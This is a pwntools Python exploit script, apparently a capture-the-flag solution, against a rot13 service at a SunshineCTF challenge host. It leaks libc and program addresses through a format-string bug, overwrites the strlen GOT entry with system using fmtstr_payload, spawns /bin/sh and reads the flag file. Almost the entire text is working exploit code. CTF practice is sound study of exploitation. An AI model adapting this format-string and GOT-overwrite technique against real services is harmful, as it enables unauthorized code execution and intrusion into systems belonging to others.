from pwn import *
from re import search
from string import maketrans, translate

context.clear(arch = 'i386')
rot13_transe = maketrans('ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz', 'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')

def rot13(arg):
  return translate(arg, rot13_transe)

s = remote('chal1.sunshinectf.org', 20006)

'''
stack situation, when we at vulnerable printf
0 [stack]        dd offset a1111              ; "1111\n"
1 [stack]        dd offset off_F7F80918       ; ld_2.23.so:F7F80918
2 >>> LIBC addr     offset loc_F7DA3325       ; libc_2.23.so:F7DA3325 add     eax, 18CCDBh ; in ___ctype_b_loc function
3 >>> program addr  offset loc_5663D95B       ; .text:5663D956 call    ___ctype_b_loc
                                              ; .text:5663D95B loc_5663D95B:
                                              ; .text:5663D95B mov     eax, [eax]
4 [stack] dd 0A000000h                        ; trash
5 [stack] dd 5                                ; trash
6 [stack] dd 5                                ; trash
7 [stack] a1111 db '1111',0Ah,0               ; our text
'''

s.recvuntil('Enter some text to be rot13 encrypted:')
s.send(rot13('%2$x|%3$x') + '\n') # leak libc and program addresses

s.recvuntil('Rot13 encrypted data: ')
text = s.recv()
text = search('(\w+)\|(\w+)', text) # parse addresses

system_offset = 0x3ada0 - 0x25325
strlen_offset = 0x1fd4 - 0x95b

libc_system = int(text.group(1), 16) + system_offset
prog_strlen = int(text.group(2), 16) + strlen_offset

log.info('libc system: 0x%x' % libc_system)
log.info('prog strlen: 0x%x' % prog_strlen)

writes = { prog_strlen : libc_system }
payload = rot13(fmtstr_payload(7, writes))
s.send(payload + '\n')

s.recvuntil('Enter some text to be rot13 encrypted:')
s.send('/bin/sh' + '\n')

s.send('ls -al' + '\n')
s.send('cat f*' + '\n')

s.interactive()